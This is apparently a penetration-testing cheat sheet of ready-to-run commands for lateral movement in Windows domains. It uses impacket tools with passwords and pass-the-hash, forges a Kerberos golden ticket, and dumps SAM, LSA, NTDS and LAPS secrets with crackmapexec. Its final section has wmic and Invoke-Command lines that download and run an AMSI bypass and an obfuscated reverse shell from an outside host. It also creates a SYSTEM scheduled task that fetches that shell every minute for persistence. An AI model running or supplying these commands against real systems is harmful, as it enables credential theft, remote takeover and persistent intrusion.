### Netowrk Lateral Movement

```
impacket-wmiexec Administrator:P@ssw0rd@192.168.10.131
impacket-wmiexec adminWebSvc:'FGjksdff89sdfj'@192.168.215.181
impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 Orlando@192.168.10.122
impacket-psexec Administrator:P@ssw0rd@192.168.10.131
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 Orlando@192.168.10.122 
```

### With Domain
```
/usr/bin/impacket-ticketer -domain activebreach.io -domain-sid <> -nthash <> Administrator
export KRB5CCNAME=Administrator.ccache
/usr/bin/impacket-wmiexec -k -no-pass -dc-ip 10.10.10.10 DC-ActiveBreach.ActiveBreach.io -target-ip 10.10.10.10
/usr/bin/impacket-psexec -k -no-pass -dc-ip 10.10.10.10 DC-ActiveBreach.ActiveBreach.io -target-ip 10.10.10.10
/usr/bin/impacket-smbexec  -k -no-pass -dc-ip 10.10.10.10 DC-ActiveBreach.ActiveBreach.io -target-ip 10.10.10.10
```

### Crackmapexec 
```
crackmapexec smb 192.168.10.131 -u Administrator -p P@ssw0rd --local-auth  --sam
crackmapexec smb 192.168.10.131 -u Administrator -p P@ssw0rd --local-auth  --lsa
crackmapexec smb 192.168.10.131 -u Administrator -p P@ssw0rd --local-auth  --lsa
crackmapexec smb 192.168.10.131 -u Administrator -p P@ssw0rd --local-auth  --lsa
crackmapexec smb 192.168.10.131 -u Administrator -p P@ssw0rd --local-auth --ntds
crackmapexec smb 192.168.10.131 -u Administrator -p P@ssw0rd --local-auth  -M laps
crackmapexec smb 192.168.10.131 -u Administrator -p P@ssw0rd --local-auth  -M ntdsutil
crackmapexec smb 192.168.10.131 -u Administrator -p P@ssw0rd --local-auth  --ntds vss
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
crackmapexec smb 192.168.10.131 -u Administrator -p P@ssw0rd --spider C\$ --pattern txt 
crackmapexec smb 192.168.10.131 -u Administrator -p P@ssw0rd -x "type C:\Windows\System32\Tasks\HackMe.txt"
```

### Miscellaneous
```
wmic /node:john.activebreach.io process call create "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ping 192.168.100.100”
wmic /node:john.activebreach.io process call create "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ep bypass IEX (New-Object Net.WebClient).DownloadString('http://192.168.100.100:8080/amsibypass.txt')”
wmic /node:john.activebreach.io process call create "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ep bypass IEX (New-Object Net.WebClient).DownloadString('http://192.168.100.100:8080/Obfuscated_RevShell.ps1')”
invoke-command -computername john.activebreach.io -scriptblock {schtasks /create /SC minute /mo 1 /RU "NT Authority\SYSTEM" /TN "Persist" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://192.168.100.100:8080/Obfuscated_RevShell.ps1''')'"}

```
